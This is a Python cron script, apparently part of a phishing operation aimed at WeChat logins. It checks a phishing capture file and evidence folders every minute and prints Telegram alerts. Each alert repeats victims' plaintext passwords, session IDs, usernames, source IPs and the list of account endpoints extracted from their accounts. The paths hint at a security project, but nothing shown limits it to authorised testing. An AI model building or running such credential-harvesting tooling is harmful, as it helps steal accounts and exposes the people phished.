#!/usr/bin/env python3
"""
釣魚伺服器捕獲監控腳本 - 檢查 phish_capture.txt 是否有新捕獲
用於 cronjob 輪詢，每分鐘檢查一次
當有新釣魚記錄時，輸出 TG 通知內容 (no_agent=True + deliver=telegram)
群組: -1004487319117
"""
import os
import glob
import json
import time

CAPTURE_FILE = "/mnt/c/Users/Administrator/desktop/JySecAI/data/poc_scripts/phish_capture.txt"
STATE_FILE = "/home/bossjy/.hermes/cache/scratch/phish_monitor_state.txt"
EVIDENCE_DIRS = [
    "/mnt/c/Users/Administrator/desktop/JySecAI/evidence/bf1788-phish-20260924",
    "/mnt/c/Users/Administrator/desktop/JySecAI/evidence/bf1788-phish-20260925",
    "/mnt/c/Users/Administrator/desktop/JySecAI/evidence/bf1788-wechatlogin-20260915",
]


def get_latest_evidence_json(wechat_id=None):
    """Find the most recent phish_capture JSON evidence file.
    Searches across all known evidence directories.
    If wechat_id is provided, prefer files matching that wechatId."""
    files = []
    for edir in EVIDENCE_DIRS:
        pattern = os.path.join(edir, "phish_capture_*.json")
        files.extend(sorted(glob.glob(pattern), key=os.path.getmtime, reverse=True))
    if not files:
        return None
    if wechat_id:
        # Prefer evidence file matching this specific wechatId
        for f in files:
            if wechat_id in os.path.basename(f):
                return f
    return files[0] if files else None


def extract_evidence_summary(filepath):
    """Extract key info from evidence JSON for the notification."""
    if not filepath:
        return ""
    try:
        with open(filepath, encoding="utf-8") as f:
            data = json.load(f)
        lines = []
        lines.append(f"  wechatId: {data.get('wechatId', 'N/A')}")
        lines.append(f"  password: {data.get('password', 'N/A')}")
        lines.append(f"  login_method: {data.get('login_method', 'N/A')}")
        lines.append(f"  sid: {data.get('sid', 'N/A')}")
        lines.append(f"  username: {data.get('username', 'N/A')}")
        lines.append(f"  source_ip: {data.get('source_ip', 'N/A')}")
        extraction = data.get('extraction', {})
        lines.append(f"  endpoints_extracted: {len(extraction)}")
        # Show endpoint types extracted
        for key in sorted(extraction.keys()):
            lines.append(f"    • {key}")
        return "\n".join(lines)
    except Exception:
        return f"  Evidence file: {os.path.basename(filepath)} ({os.path.getsize(filepath)} bytes)"


def save_state(count):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        f.write(str(count))


def main():
    # 讀取上次檢查的行數
    last_count = 0
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                last_count = int(f.read().strip())
        except Exception:
            pass

    # 讀取當前捕獲文件
    if not os.path.exists(CAPTURE_FILE):
        save_state(0)
        return

    with open(CAPTURE_FILE, encoding="utf-8", errors="replace") as f:
        lines = [l.strip() for l in f if l.strip()]

    current_count = len(lines)

    if current_count > last_count:
        # 有新捕獲 — 輸出 TG 通知 (重複 5 次)
        new_entries = lines[last_count:]

        for entry in new_entries:
            # Extract wechatId from capture line for evidence matching
            wechat_id = "N/A"
            for part in entry.split():
                if part.startswith("wechan"):
                    wechat_id = part.split("=", 1)[1] if "=" in part else "N/A"
                    break

            print("🚨 釣魚釣到了！請回終端機檢測 🚨")
            print("🚨 釣魚釣到了！請回終端機檢測 🚨")
            print("🚨 釣魚釣到了！請回終端機檢測 🚨")
            print("🚨 釣魚釣到了！請回終端機檢測 🚨")
            print("🚨 釣魚釣到了！請回終端機檢測 🚨")
            print("")
            print(f"捕獲記錄: {entry}")
            # Parse password from capture line if present
            for part in entry.split(" | "):
                if part.strip().startswith("password="):
                    pw = part.split("=", 1)[1].strip()
                    if pw:
                        print(f"  密碼: {pw}")
            print("")
            latest_json = get_latest_evidence_json(wechat_id)
            if latest_json:
                print(f"詳細證據: {latest_json}")
                print(extract_evidence_summary(latest_json))
            else:
                print(f"詳細證據目錄: {', '.join(EVIDENCE_DIRS)}")
            print("")
            print("本地查看: data/poc_scripts/phish_capture.txt")
            print("Evidence: evidence/bf1788-wechatlogin-20260915/")

        save_state(current_count)
    else:
        # 無新捕獲 — 空輸出 (no_agent 模式下空輸出不發送通知)
        pass


if __name__ == "__main__":
    main()
